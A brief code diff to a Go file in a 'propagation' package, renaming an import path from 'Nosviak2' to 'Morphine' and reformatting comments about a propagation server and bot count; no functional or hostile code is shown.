@@ -1,13 +1,13 @@
 package propagation
 
 import (
-	"Nosviak2/core/sources/layouts/toml"
+	"Morphine/core/sources/layouts/toml"
 	"fmt"
 	"net"
 )
 
-//makes the propagation server properly
-//this allows bot **COUNT** transition properly
+// makes the propagation server properly
+// this allows bot **COUNT** transition properly
 func MakePropagation() error { //err handles properly
 
 	//tries to catch the listener
